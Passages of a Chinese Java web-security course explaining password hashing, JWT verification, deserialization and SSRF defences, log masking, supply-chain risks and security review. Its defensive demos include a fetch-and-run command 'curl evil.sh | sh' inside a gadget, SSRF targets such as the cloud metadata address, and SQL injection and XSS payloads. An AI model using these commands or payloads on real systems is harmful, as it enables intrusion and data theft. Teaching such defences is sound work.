                if (o.id() == orderId && o.ownerId() == claimedUserId) {
                    return new Result(200, o.item() + " / " + o.amount() + " 元");
                }
            }
            return new Result(404, "not found");
        }
    }

    static void idorBasics() {
        System.out.println("【IDOR：把 id 改一下就看到别人的数据】");
        OrderApi api = new OrderApi();
        User zhangsan = USERS.get(0);
        User lisi = USERS.get(1);

        System.out.println("  张三（id=1）查自己的 1001：" + api.naive(1001));
        System.out.println("  张三（id=1）查李四的 1002：" + api.naive(1002) + "  <- 越权成功");
        System.out.println("  李四（id=2）查自己的 1002：" + api.naive(1002));
        System.out.println();
        System.out.println("  只校验登录也挡不住：");
        System.out.println("    张三已登录，查 1002 -> " + api.loginOnly(1002, zhangsan));
        System.out.println("  「登录了」不等于「这条数据归你」");
        System.out.println();
    }

    static void scopedQuery() {
        System.out.println("【正确写法：把归属写进查询条件】");
        OrderApi api = new OrderApi();
        User zhangsan = USERS.get(0);
        User lisi = USERS.get(1);
        System.out.println("  SQL: SELECT * FROM orders WHERE id = ? AND owner_id = ? AND tenant_id = ?");
        System.out.println("  张三查 1001 -> " + api.scoped(1001, zhangsan));
        System.out.println("  张三查 1002 -> " + api.scoped(1002, zhangsan) + "  <- 查不到，和不存在一样");
        System.out.println("  李四查 1002 -> " + api.scoped(1002, lisi));
        System.out.println("  关键点：越权时返回 404 而不是 403，避免泄露「这条数据存在」");
        System.out.println();
    }

    static void verticalPrivilege() {
        System.out.println("【垂直越权：普通用户调管理员接口】");
        OrderApi api = new OrderApi();
        User zhangsan = USERS.get(0);
        User wangwu = USERS.get(2);
        User zhaoliu = USERS.get(3);
        System.out.println("  张三(user) 查 1002 -> " + api.scopedAdmin(1002, zhangsan));
        System.out.println("  王五(admin, 租户7) 查 1002 -> " + api.scopedAdmin(1002, wangwu) + "  <- 同租户可管");
        System.out.println("  王五(admin, 租户7) 查 1004 -> " + api.scopedAdmin(1004, wangwu) + "  <- 跨租户也不行");
        System.out.println("  赵六(user, 租户9) 查 1004 -> " + api.scopedAdmin(1004, zhaoliu));
        System.out.println("  管理员身份也要受租户边界约束，否则一个租户的管理员能看全平台");
        System.out.println();
    }

    static void trustingClientId() {
        System.out.println("【userId 从参数里取 = 把授权交给攻击者】");
        OrderApi api = new OrderApi();
        System.out.println("  请求 POST /api/order/detail  body: {orderId:1002, userId:2}");
        System.out.println("  张三把 userId 改成 2 -> " + api.trustingParam(1002, 2));
        System.out.println("  正确：userId 从会话/token 里取，请求体里的 userId 一律忽略");
        System.out.println();
    }

    static void uuidIsNotAuth() {
        System.out.println("【换 UUID 只是提高门槛，不是防护】");
```

### 36-06 密码存储与加盐哈希

**知识点**
- **密码绝不能明文存，也不能可逆加密存**。加密意味着「有密钥就能还原」，一旦密钥泄露（配置、备份、内存转储）等于全量泄露。密码只需要**验证**，不需要还原，所以要用**单向哈希**。
- **MD5/SHA-1/SHA-256 都不行**：它们是为「快」设计的，GPU 每秒能算几十亿次。8 位密码的哈希空间，用现成字典 + 规则，几小时就能跑完。加盐只能防「彩虹表」，防不住「针对单个用户的暴力破解」。
- **必须用「慢哈希」**：bcrypt、scrypt、Argon2、PBKDF2。它们通过可调的计算成本（迭代次数、内存占用）让每次尝试变慢，把暴力破解的成本拉高几个数量级。
- **推荐 Argon2id**（内存硬，抗 GPU/ASIC），其次 bcrypt（成熟、库多）。bcrypt 的 cost 建议 ≥ 12（约 250 ms），Argon2id 建议内存 19 MiB、迭代 2 次、并行度 1（OWASP 2024 基线）。
- **盐必须每个用户独立随机**：长度 ≥ 16 字节，用 `SecureRandom` 生成，和哈希一起存。共用盐等于没加盐 —— 两个相同密码还是同样的哈希，一次破解就批量命中。
- **参数要存进哈希串**：bcrypt 的 `$2a$12$...` 自带 cost 和 salt，Argon2 的 `$argon2id$v=19$m=19456,t=2,p=1$...` 自带全部参数。这样以后调高强度，老密码还能验证，登录成功后再悄悄升级。
- **不要自己拼哈希**：`sha256(salt + password)` 这种自己设计的方案几乎都错。用库，`BCryptPasswordEncoder`、`Argon2PasswordEncoder`、`Pbkdf2PasswordEncoder`。
- **比较要用常量时间**：普通 `String.equals` 会在第一个不同字节就返回，理论上可被计时攻击。哈希比较用库提供的 `matches()`（内部已做常量时间比较）。
- **密码策略要现实**：长度 ≥ 12 比「必须含大小写+数字+符号」更有效；检查是否在已泄露密码库（Have I Been Pwned 的 k-anonymity API）；不要强制定期改密码（会导致 `Password1!` → `Password2!`）；不要设置荒谬的最大长度（bcrypt 只取前 72 字节，超长要预哈希）。
- **其他凭据也一样**：API Key、重置 token、邀请码，都要「随机生成 + 哈希存储 + 有效期 + 一次性」。
- 易错点：把盐也当秘密（盐不需要保密，保密的是哈希算法强度）；用 `Random` 而不是 `SecureRandom` 生成盐；把密码写进日志；把密码放进 URL 参数；忘记限制登录失败次数（慢哈希挡不住在线爆破，要靠限流和锁定）。

```java
    static final int ITERATIONS = 210_000;
    static final int SALT_BYTES = 16;
    static final int KEY_BITS = 256;

    static final SecureRandom RANDOM = new SecureRandom();

    static byte[] randomSalt() {
        byte[] salt = new byte[SALT_BYTES];
        RANDOM.nextBytes(salt);
        return salt;
    }

    /** PBKDF2-HMAC-SHA256，纯 JDK 实现 */
    static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int keyBits) {
        try {
            javax.crypto.spec.PBEKeySpec spec =
                    new javax.crypto.spec.PBEKeySpec(password, salt, iterations, keyBits);
            return javax.crypto.SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
                    .generateSecret(spec).getEncoded();
        } catch (Exception e) {
            throw new IllegalStateException(e);
        }
    }

    /** 存储格式：算法$迭代次数$盐$哈希，参数随密码一起存 */
    record StoredPassword(String algorithm, int iterations, byte[] salt, byte[] hash) {
        String encode() {
            return algorithm + "$" + iterations + "$"
                    + HexFormat.of().formatHex(salt) + "$"
                    + HexFormat.of().formatHex(hash);
        }

        static StoredPassword decode(String s) {
            String[] p = s.split("\\$");
            return new StoredPassword(p[0], Integer.parseInt(p[1]),
                    HexFormat.of().parseHex(p[2]), HexFormat.of().parseHex(p[3]));
        }
    }

    static StoredPassword hash(char[] password) {
        byte[] salt = randomSalt();
        return new StoredPassword("pbkdf2-sha256", ITERATIONS, salt,
                pbkdf2(password, salt, ITERATIONS, KEY_BITS));
    }

    /** 常量时间比较，避免计时侧信道 */
    static boolean constantTimeEquals(byte[] a, byte[] b) {
        if (a.length != b.length) {
            return false;
        }
        int diff = 0;
        for (int i = 0; i < a.length; i++) {
            diff |= a[i] ^ b[i];
        }
        return diff == 0;
    }

        byte[] candidate = pbkdf2(password, stored.salt(), stored.iterations(), stored.hash().length * 8);
        return constantTimeEquals(candidate, stored.hash());
    }
```

### 36-07 JWT 与 Session 安全

**知识点**
- **Session 是「服务端有状态」**：登录后服务端存一份会话（内存/Redis），浏览器只拿一个随机 `SESSIONID`。好处是可随时吊销、能存任意数据；代价是集群要共享存储（Redis），且有状态。
- **JWT 是「客户端有状态」**：把用户信息 + 签名打包成一个字符串发给客户端，服务端不存。好处是无状态、好扩展；代价是**签发后无法撤销**（除非引入黑名单，那又变成有状态了）。
- **JWT 三段式**：`base64url(header).base64url(payload).base64url(signature)`。前两段只是 **Base64 编码，不是加密** —— 任何人都能解开看内容，所以**绝不能往 payload 里放密码、身份证号等敏感数据**。
- **签名才是防篡改的东西**：`signature = HMAC-SHA256(base64(header) + "." + base64(payload), secret)`（对称）或 RSA/ECDSA 私钥签名（非对称）。校验时要**重算签名并常量时间比较**，不能只解出 payload 就用。
- **`alg: none` 是经典大坑**：库如果信任头部的 `alg` 字段，攻击者改成 `"alg":"none"` 并去掉签名就能伪造。防护：**服务端固定允许的算法白名单**，绝不读客户端的 alg 决定用什么验证。
- **对称密钥泄露 = 所有人都能签发 token**：HS256 的 secret 必须 ≥ 256 位随机（`SecureRandom`），不能是 `"secret"`、项目名、配置里的默认值。多服务共享密钥时更要走密钥管理（KMS/Vault），支持轮换。
- **一定要校验的字段**：`exp`（过期时间，必须短，如 15 分钟）、`nbf`（生效时间）、`iss`（签发者）、`aud`（受众，防止 A 系统的 token 用在 B 系统）、`sub`（主体）。跳过任何一个都可能导致「过期 token 能用」「跨系统串用」。
- **access token 短 + refresh token 长**是标准组合：access 15 分钟无状态快速校验；refresh 存服务端（可撤销、可轮换、绑定设备），用于换新 access。refresh 只能用一次（一次性轮换），旧的就作废。
- **放哪里**：JWT 放 `Authorization: Bearer` 头优于放 Cookie（不吃 CSRF）；若必须放 Cookie，则要 `HttpOnly + Secure + SameSite`，并额外加 CSRF token。
- **别把 JWT 当 session 硬套**：需要「立刻踢下线」「查看在线设备」「改权限立即生效」的场景，纯 JWT 做不到，要么短过期 + 黑名单，要么老老实实用带状态的 Session。
- 易错点：把敏感信息塞 payload；secret 用默认值或提交进 Git；`exp` 设成一年；不校验 `aud`/`iss`；客户端解析 payload 就信任里面的 role（必须以服务端校验签名为准）；token 出现在 URL/日志里。

```java
        static String b64url(byte[] b) {
            return Base64.getUrlEncoder().withoutPadding().encodeToString(b);
        }

        static byte[] b64urlDecode(String s) {
            return Base64.getUrlDecoder().decode(s);
        }

        static byte[] hmacSha256(String secret, String data) {
            try {
                Mac mac = Mac.getInstance("HmacSHA256");
                mac.init(new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), "HmacSHA256"));
                return mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
            } catch (Exception e) {
                throw new IllegalStateException(e);
            }
        }

        static String sign(String secret, String headerJson, String payloadJson) {
            String h = b64url(headerJson.getBytes(StandardCharsets.UTF_8));
            String p = b64url(payloadJson.getBytes(StandardCharsets.UTF_8));
            String sig = b64url(hmacSha256(secret, h + "." + p));
            return h + "." + p + "." + sig;
        }

        static String[] split(String token) {
            String[] parts = token.split("\\.", -1);
            if (parts.length != 3) {
                throw new IllegalArgumentException("格式错误：段数=" + parts.length);
            }
            return parts;
        }

        /** 只看内容，不验签 —— 必须清楚这一步是不可信的 */
        static String peekPayload(String token) {
            return new String(b64urlDecode(split(token)[1]), StandardCharsets.UTF_8);
        }

        static boolean constantTimeEquals(byte[] a, byte[] b) {
            if (a.length != b.length) {
                return false;
            }
            int diff = 0;
            for (int i = 0; i < a.length; i++) {
                diff |= a[i] ^ b[i];
            }
            return diff == 0;
        }

        /** 正确校验：固定算法 + 重算签名 + 校验 exp/aud/iss */
        static String verify(String secret, String token, String expectedAud, long nowSec) {
            String[] parts = split(token);
            String header = new String(b64urlDecode(parts[0]), StandardCharsets.UTF_8);
            if (!header.contains("\"alg\":\"HS256\"")) {
                return "拒绝：算法不在白名单（只接受 HS256）";
            }
            byte[] expected = hmacSha256(secret, parts[0] + "." + parts[1]);
            byte[] actual = b64urlDecode(parts[2]);
            if (!constantTimeEquals(expected, actual)) {
                return "拒绝：签名不匹配（已被篡改）";
            }
            String payload = new String(b64urlDecode(parts[1]), StandardCharsets.UTF_8);
            long exp = readLong(payload, "\"exp\":");
            long nbf = readLong(payload, "\"nbf\":");
            String aud = readString(payload, "\"aud\":\"");
            String iss = readString(payload, "\"iss\":\"");
            if (nowSec < nbf) {
                return "拒绝：尚未生效（nbf）";
            }
            if (nowSec > exp) {
                return "拒绝：已过期（exp）";
            }
            if (!expectedAud.equals(aud)) {
                return "拒绝：受众不符（aud=" + aud + "）";
            }
            if (!"auth.example.com".equals(iss)) {
                return "拒绝：签发者不符（iss=" + iss + "）";
            }
            return "通过：" + payload;
        }

        static long readLong(String json, String key) {
            int i = json.indexOf(key);
            if (i < 0) {
                return 0;
            }
            int j = i + key.length();
            int k = j;
            while (k < json.length() && (Character.isDigit(json.charAt(k)) || json.charAt(k) == '-')) {
                k++;
            }
            return Long.parseLong(json.substring(j, k));
        }

        static String readString(String json, String key) {
            int i = json.indexOf(key);
            if (i < 0) {
                return "";
            }
            int j = i + key.length();
            int k = json.indexOf('"', j);
            return json.substring(j, k);
        }
    }
```

### 36-08 不安全反序列化与 SSRF

**知识点**
- **反序列化把「数据」变成「对象」，如果数据可控且能指定类，就等于让攻击者构造对象**。Java 原生反序列化（`ObjectInputStream.readObject`）尤其危险：它信任字节流里写的类名，会去加载并调用 `readObject`，从而触发任意代码。
- ** gadget chain**：攻击者不直接写恶意类，而是把依赖库里已有的类串起来（如 `HashMap` → `TemplatesImpl`、CommonsCollections 链），最终执行命令。所以「有没有漏洞」取决于 classpath 里有没有可用的链。
- **防护首选是「不用原生反序列化」**：改用 JSON（Jackson/Gson）+ 明确的 DTO。JSON 只能构造数据，不能指定类，没有 gadget 问题。
- **如果必须反序列化，就上白名单 `ObjectInputFilter`**：只允许期望的类，其他一律拒绝。JDK 9+ 的 `ObjectInputFilter` 就是为此设计的。
- **`readObject` 要限制深度和大小**：防「反序列化炸弹」（嵌套 `HashSet` 造成指数级 `hashCode` 调用，CPU 打满）。
- **Jackson 的坑是「多态自动类型」**：开 `enableDefaultTyping()` 或 `@JsonTypeInfo` 用了 `Id.CLASS`/`Id.MINIMAL_CLASS`，攻击者就能在 JSON 里指定 `@class` 字段触发链。防护：**不用基于类名的多态**，或限定 `@JsonSubTypes` 白名单。
- **Fastjson 的 `autoType` 同类风险**：历史上大量 CVE。原则一样 —— 不信任输入里的类型名。
- **SSRF（服务端请求伪造）**：服务端有个「按 URL 抓取」的功能（图片代理、Webhook、导出 PDF），攻击者传 `http://169.254.169.254/latest/meta-data/` 去读云元数据，或 `http://127.0.0.1:6379/` 打内网 Redis。**本质是把服务端当成代理去打内网**。
- **SSRF 防护不能只靠黑名单**（`127.0.0.1`、`192.168.*` 太容易被绕过：十进制 IP、八进制、`0.0.0.0`、DNS 重绑定、302 跳转）。正确做法：**「先解析成 IP，再基于 IP 判断是否内网，然后直连这个 IP 并带上原始 Host/SNI」**，同时禁用跟随跳转，或每一跳都重新校验。
- **SSRF 的加固组合**：URL 协议白名单（只允许 `http`/`https`）、出站走独立网段 + 防火墙禁止访问元数据地址、设置超时和响应大小上限、失败信息不要回显内部细节。
- 易错点：只在第一跳校验 URL、允许任意重定向；用字符串做黑名单匹配；把内网服务当作「反正是内网所以安全」；反序列化接口对外网开放。

```java
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputFilter;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.URI;
import java.util.ArrayList;

    /** 允许被反序列化的类型：白名单，只有它和数据成员 */
    record Money(long cents, String currency) implements Serializable {
    }

    static byte[] serialize(Object o) {
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(o);
            return bos.toByteArray();
        } catch (Exception e) {
            throw new IllegalStateException(e);
        }
    }

    static Object readUnsafe(byte[] data) {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            return ois.readObject();
        } catch (Exception e) {
            return "反序列化异常：" + e.getClass().getSimpleName();
        }
    }

    static Object readWithFilter(byte[] data, String pattern) {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(pattern));
            return ois.readObject();
        } catch (Exception e) {
            return "被拦截：" + e.getClass().getSimpleName();
        }
    }

            this.command = command;
        }

            in.defaultReadObject();
            System.out.println("    [gadget 在 readObject 里执行了] cmd=" + command);
        }
    }

        System.out.println("    结果 -> " + readUnsafe(evil));
        System.out.println("  问题：readObject 被自动调用，构造对象时就执行了副作用");
        System.out.println("  真实 gadget 链不需要自定义类，用依赖库里的类就能达成");
        System.out.println();
    }

        byte[] evil = serialize(new DangerousGadget("curl evil.sh | sh"));

        String pattern = "DeserializeSsrf$Money;java.lang.Long;java.lang.String;!*";
        System.out.println("  filter: " + pattern);
        System.out.println("    正常数据 -> " + readWithFilter(good, pattern));
        System.out.println("    恶意数据 -> " + readWithFilter(evil, pattern));
        System.out.println("  规则：列出允许的类，末尾 !* 表示其余全部拒绝");
        System.out.println("  再加一层：限制数组长度、对象深度、字节数上限，防反序列化炸弹");
        System.out.println();
    }

    static void preferJson() {
        System.out.println("【首选：换掉原生序列化】");

    static long parseNumber(String s) {
        try {
            if (s.startsWith("0x") || s.startsWith("0X")) {
                return Long.parseLong(s.substring(2), 16);
            }
            if (s.length() > 1 && s.charAt(0) == '0') {
                return Long.parseLong(s.substring(1), 8);
            }
            return Long.parseLong(s);
        } catch (NumberFormatException e) {
            return -1;
        }
    }

    /** 把各种 IP 写法归一化成点分十进制；不是 IP 字面量则返回 null */
    static String toDotted(String host) {
        if (host == null || host.isEmpty()) {
            return null;
        }
        if (host.startsWith("[") && host.endsWith("]")) {
            return host.substring(1, host.length() - 1);
        }
        if (host.indexOf('.') < 0) {
            long v = parseNumber(host);
            if (v < 0 || v > 0xFFFFFFFFL) {
                return null;
            }
            return ((v >> 24) & 255) + "." + ((v >> 16) & 255) + "."
                    + ((v >> 8) & 255) + "." + (v & 255);
        }
        String[] p = host.split("\\.", -1);
        if (p.length == 4) {
            long[] n = new long[4];
            for (int i = 0; i < 4; i++) {
                n[i] = parseNumber(p[i]);
                if (n[i] < 0 || n[i] > 255) {
                    return null;
                }
            }
            return n[0] + "." + n[1] + "." + n[2] + "." + n[3];
        }
        if (p.length == 2) {
            long a = parseNumber(p[0]);
            long b = parseNumber(p[1]);
            if (a < 0 || a > 255 || b < 0 || b > 0xFFFFFF) {
                return null;
            }
            return a + "." + ((b >> 16) & 255) + "." + ((b >> 8) & 255) + "." + (b & 255);
        }
        return null;
    }

    /** getHost() 对 127.1、2130706433 这类写法可能返回 null，回退到 authority 并去掉端口 */
    static String hostOf(URI uri) {
        String host = uri.getHost();
        if (host != null && !host.isEmpty()) {
            return host;
        }
        String auth = uri.getAuthority();
        if (auth == null) {
            return null;
        }
        int at = auth.lastIndexOf('@');
        if (at >= 0) {
            auth = auth.substring(at + 1);
        }
        if (auth.startsWith("[")) {
            int close = auth.indexOf(']');
            return close > 0 ? auth.substring(0, close + 1) : auth;
        }
        int colon = auth.indexOf(':');
        return colon >= 0 ? auth.substring(0, colon) : auth;
    }

    static String resolveHost(String host) {
        if (host == null || host.isEmpty()) {
            return null;
        }
        String fake = FAKE_DNS.get(host);
        return fake != null ? fake : toDotted(host);
    }

    /** 按解析出的 IP 判归属，而不是按字符串 */
    static String classify(String ip) {
        if (ip.contains(":")) {
            if (ip.equals("::1") || ip.equals("::") || ip.startsWith("fe80")
                    || ip.startsWith("fc") || ip.startsWith("fd")) {
                return "内网/环回";
            }
            return "公网";
        }
        String[] p = ip.split("\\.");
        int a = Integer.parseInt(p[0]);
        int b = Integer.parseInt(p[1]);
        if (a == 127 || a == 10 || a == 0) {
            return "内网/环回";
        }
        if (a == 169 && b == 254) {
            return "链路本地（云元数据）";
        }
        if (a == 192 && b == 168) {
            return "内网";
        }
        if (a == 172 && b >= 16 && b <= 31) {
            return "内网";
        }
        if (a == 100 && b >= 64 && b <= 127) {
            return "运营商级 NAT";
        }
        return "公网";
    }

    static String validateUrl(String raw) {
        URI uri;
        try {
            uri = URI.create(raw);
        } catch (Exception e) {
            return "拒绝：URL 非法";
        }
        String scheme = uri.getScheme();
        if (scheme == null || !(scheme.equals("http") || scheme.equals("https"))) {
            return "拒绝：协议不在白名单（" + scheme + "）";
        }
        String host = hostOf(uri);
        if (host == null || host.isEmpty()) {
            return "拒绝：缺少主机名";
        }
        String ip = resolveHost(host);
        if (ip == null) {
            return "拒绝：无法解析主机（" + host + "）";
        }
        String kind = classify(ip);
        if (!kind.equals("公网")) {
            return "拒绝：" + kind + "（" + host + " -> " + ip + "）";
        }
        int port = uri.getPort() < 0 ? (scheme.equals("https") ? 443 : 80) : uri.getPort();
        return "通过 -> 直连 " + ip + ":" + port + "（Host: " + host + "）";
    }
```

### 36-09 敏感信息泄露与日志脱敏

**知识点**
- **敏感信息泄露是最常见也最容易被忽视的漏洞**：不在业务逻辑里，而在「顺手打的一条日志」「异常栈直接返回前端」「报错页面显示 SQL」。
- **数据分级**：公开 / 内部 / 机密 / 绝密。身份证、手机号、银行卡、密码、token、密钥、健康记录属于机密以上，任何出口（日志、响应、监控、消息队列、缓存、备份、截图）都要脱敏或加密。
- **脱敏不是「删掉」，而是「保留可用性」**：手机号 `138****8888`、身份证 `110101********1234`、卡号 `**** **** **** 1234`。客服需要按后四位查单，所以后四位要留。
- **日志要分层**：DEBUG 可以详细但要本地开关；生产默认 INFO，且**日志本身不能带敏感字段**。用日志框架的脱敏（如 Logback 的 `ReplacingCompositeConverter`、Log4j2 的 `PatternLayout` 替换）做兜底，但不要只靠它。
- **异常不能直接回前端**：`e.printStackTrace()` 到响应体，会泄露类名、路径、SQL、中间件版本。应该返回统一错误码 + 请求 ID，详细信息只进服务端日志。
- **HTTP 响应头也会泄露**：`Server: nginx/1.18.0`、`X-Powered-By: PHP/7.4`、`X-AspNet-Version`。关掉或改掉版本信息。
- **响应体要按需返回**：`SELECT *` 后把整个实体序列化，会把 `password_hash`、`salt`、内部备注一起发出去。用 DTO 显式挑字段，不要「图省事全返回」。
- **前端 Map/JSON 里的隐藏字段**：`<input type="hidden" value="user_id=1">`、注释里的 TODO、source map 里未压缩的代码，都是泄露源。
- **错误信息要统一**：登录失败统一提示「用户名或密码错误」，不要区分「用户不存在」/「密码错误」（用户枚举）。忘记密码同理。
- **脱敏要正则在「输出前」做，而不是在「输入时」做**：输入时脱敏会破坏业务（比如你还要用完整手机号发短信），输出时脱敏才对。
- **审计日志与业务日志分开**：谁在什么时候改了什么，要能追溯，但审计日志本身也要防篡改、防泄露。
- 易错点：把脱敏写在 `toString()` 里以为万无一失（反射、序列化、`Objects.toString` 可能绕过）；日志里打印完整请求体；把 token 拼进 URL；监控大盘直接显示原始数据。

```java
import java.util.LinkedHashMap;

public class SensitiveDataMasking {
    /** 各类敏感信息的脱敏规则：保留首尾，中间打码 */
    static String maskPhone(String s) {
        return s.replaceAll("(\\d{3})\\d{4}(\\d{4})", "$1****$2");
    }

    static String maskIdCard(String s) {
        return s.replaceAll("(\\d{6})\\d{8}(\\d{4})", "$1********$2");
    }

    static String maskBankCard(String s) {
        return s.replaceAll("(\\d{4})\\d{8,11}(\\d{4})", "$1********$2");
    }

    static String maskEmail(String s) {
        return s.replaceAll("([\\w.]{1,2})[\\w.]*(@[\\w.]+)", "$1***$2");
    }

    static String maskName(String s) {
        if (s.length() <= 1) {
            return s;
        }
        return s.charAt(0) + "*".repeat(s.length() - 1);
    }

    static String maskSecret(String s) {
        if (s.length() <= 8) {
            return "***";

        return s.substring(0, 4) + "****" + s.substring(s.length() - 4);

    record Desensitizer(Map<String, Function<String, String>> rules) {
        static Desensitizer defaultRules() {
            Map<String, Function<String, String>> m = new LinkedHashMap<>();
            m.put("phone", SensitiveDataMasking::maskPhone);
            m.put("idCard", SensitiveDataMasking::maskIdCard);
            m.put("bankCard", SensitiveDataMasking::maskBankCard);
            m.put("email", SensitiveDataMasking::maskEmail);
            m.put("name", SensitiveDataMasking::maskName);
            m.put("password", s -> "******");
            m.put("token", SensitiveDataMasking::maskSecret);
            return new Desensitizer(m);

            Function<String, String> f = rules.get(field);
```

### 36-10 依赖供应链与安全响应头

**知识点**
- **供应链攻击的入口比你想象的多**：直接依赖、传递依赖、Maven/Gradle 插件、基础镜像、CI 里的 action、甚至 IDE 插件。你只写了 10 行依赖，实际拉进来 300 个 jar。
- **传递依赖是盲区**：`spring-core` 会带 `spring-jcl`，`jackson-databind` 会带 `jackson-core`/`jackson-annotations`。漏洞经常出在你「没直接写过」的那个包上（Log4Shell 就是这样扫出来的）。
- **CVSS 高分不等于必须立刻修**：CVSS 衡量的是「漏洞本身的严重程度」，但还要看**可达性**（你的代码有没有走到那条路径）、**是否暴露在公网**、**是否有缓解措施**。EPSS 给的是「未来 30 天被利用的概率」，两者结合才能排优先级。
- **依赖混淆（dependency confusion）**：内部包叫 `com.heima:common-utils`，如果构建配置允许「私有仓库找不到就去中央仓库找」，攻击者抢先在中央仓库发布同名包（版本号更高），构建时就会被拉进来。
- **仿冒包（typosquatting）**：`spring-core` → `springcore`、`log4j-core` → `log4jcore`、`requests` → `request`。名字差一个字符，下载量可能差几个数量级。
- **恶意包常见手法**：`postinstall` 脚本执行命令、构建插件在编译期跑代码、读取环境变量里的 token/密钥、把代码混淆后藏在小文件里。
- **防护是一套组合**：
  - 私有仓库做代理 + `<mirrorOf>*</mirrorOf>` 把中央仓库也走代理，**禁止 fallback 到公网**；
  - 依赖白名单（只允许清单内的 group/artifact）；
  - 锁定版本（`dependencyManagement`、BOM、Gradle lockfile），禁用 `LATEST`/`RELEASE`/`[1.0,2.0)` 这类动态版本；
  - 校验 checksum 与签名；
  - 每次构建跑 SCA（软件成分分析），产出 SBOM（CycloneDX/SPDX）；
  - 最小依赖：能不引就不引，能引小的就不引大的。
- **安全响应头是浏览器侧的最后一道防线**：应用层漏了，响应头还能兜住一部分。
  - `Content-Security-Policy`：限制页面能加载/执行什么，是防 XSS 的最后一道。
  - `Strict-Transport-Security`：告诉浏览器「以后只用 HTTPS 访问我」，防降级与中间人。
  - `X-Content-Type-Options: nosniff`：禁止浏览器猜 MIME，防止把 `.txt` 当脚本执行。
  - `X-Frame-Options` / CSP 的 `frame-ancestors`：防点击劫持。
  - `Referrer-Policy`：控制 Referer 带多少信息，防止 URL 里的 token 泄露给第三方。
  - `Permissions-Policy`：关掉不需要的摄像头/麦克风/定位。
  - `Cross-Origin-Opener-Policy` / `Cross-Origin-Resource-Policy`：隔离跨窗口与跨源资源读取。
- **CSP 的三个阶段**：`'unsafe-inline'`（等于没防）→ `nonce-xxx`（每次响应随机，内联脚本要带这个 nonce）→ `'strict-dynamic'`（信任链传递，配合 nonce 是当前最佳实践）。先用 `Content-Security-Policy-Report-Only` 观察，再切正式。
- **CORS 和 CSP 不是一回事**：CORS 管「别的源能不能**读**我的响应」，CSP 管「我的页面能**加载/执行**什么」。CORS 配错等于把数据敞开。
- **CORS 四个典型错误**：把请求的 `Origin` 原样反射回去（等于允许所有人）、信任 `Origin: null`（sandbox iframe 与 `data:` URL 能发）、`Access-Control-Allow-Origin: *` 配 `Allow-Credentials: true`（浏览器会拒绝，但有人用反射绕过）、允许 `*.example.com`（任一子域被拿下就能打主站）。
- 易错点：只扫直接依赖；只看 CVSS 不看可达性；响应头在应用里配了但被 CDN/网关覆盖；HSTS 没加 `includeSubDomains`；CSP 一直停在 Report-Only 就当已生效；把 `X-Frame-Options: ALLOW-FROM` 当有效（现代浏览器已不支持）。

```java
    static int[] ver(String v) {
        List<Integer> parts = new ArrayList<>();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < v.length(); i++) {
            char c = v.charAt(i);
            if (Character.isDigit(c)) {
                sb.append(c);
            } else if (c == '.' && sb.length() > 0) {
                parts.add(Integer.parseInt(sb.toString()));
                sb.setLength(0);
            } else if (c != '.' && c != '-') {
                break;
            }
        }
        parts.add(sb.length() == 0 ? 0 : Integer.parseInt(sb.toString()));
        int[] a = new int[parts.size()];
        for (int i = 0; i < a.length; i++) {
            a[i] = parts.get(i);
        }
        return a;

        int[] x = ver(a);
        int[] y = ver(b);

        for (int i = 0; i < n; i++) {
            int xi = i < x.length ? x[i] : 0;
            int yi = i < y.length ? y[i] : 0;
            if (xi != yi) {

            }
```

### 36-11 综合案例：一次接口安全评审

**知识点**
- **安全评审不是「跑个扫描器」，而是按攻击面逐项过**。工具只能发现已知模式，业务逻辑漏洞（越权、重复提交、金额篡改）只能靠人看。
- **九个必查维度**：认证与会话、授权与数据归属、输入校验、输出编码、数据保护（存储/传输/脱敏）、配置与响应头、依赖与供应链、日志与监控、业务逻辑。每个维度都要有「查什么」和「怎么验」。前八个是技术面，最后一个是业务面——「重复退款」「金额篡改」这类问题都出在这里，扫描器一个都发现不了。
- **一条合格的发现要写清五件事**：位置（哪个接口哪一行）、证据（怎么复现）、影响（能造成什么后果）、修复（具体怎么改）、验证（改完怎么确认）。只写「存在越权风险」等于没写。
- **分级与放行门禁**：严重（可导致数据泄露/资金损失/远程执行）与高危必须在**上线前**修完；中危可以带条件上线（有缓解措施 + 排期）；低危进迭代。门禁要写进 CI，不能靠开会决定。
- **修复优先级不等于严重级别**：还要乘上「利用难度」和「暴露面」。一个公网可达、无需登录的严重漏洞，优先级远高于需要内网权限的高危漏洞。
- **每个发现都要映射一个回归测试**：否则修完过两个月重构又回来了。测试要写成「用 A 的 token 请求 B 的数据，期望 404」这种可执行的断言。
- **评审要覆盖「异常路径」**：正常流程大家都测，漏洞往往在「参数为空」「id 不存在」「重复提交」「并发」里。
- **复盘比清单更重要**：这些问题是「需求阶段没写安全要求」「评审只看功能」「测试只测正常路径」还是「赶上线跳过了卡点」？找到流程原因，才能避免下一批同样的漏洞。
- **安全左移**：在设计阶段做威胁建模（36-01），编码阶段用安全基线（36-02~36-09），提交阶段用 SCA 与 SAST 卡点（36-10），上线前做这一课的评审。
- 易错点：评审只做一次，之后新接口不再过；只评审「新增代码」不看被改动的老接口；发现写了但没有责任人和截止时间；把「已加 WAF 规则」当作代码修复。

## 本章综合练习

### 综合题：一次接口安全评审

**场景**

对一段存在多处漏洞的订单查询接口做安全评审：SQL 注入、XSS、越权（IDOR）、密码存储、JWT 伪造、反序列化、敏感信息泄露，逐条复现漏洞再给出修复方案。

**任务**
1. 复现 SQL 注入：用拼接写法构造 ' OR '1'='1，再用参数化查询修复，对比两次返回结果。
2. 复现越权：用户 A 拿用户 B 的订单 id 直接查询成功，修复为「查询必须带当前用户 id 条件」，并写测试证明修复生效。
3. 复现 XSS：把用户输入的 <script> 原样输出到页面，修复为按上下文做 HTML 编码，并说明为什么不能只过滤 <script>。
4. 用 PBKDF2 加盐存储密码，对比明文、MD5、加盐慢哈希三种方案的抗破解能力；再演示 JWT 不校验签名时被篡改的效果。

**验收清单**
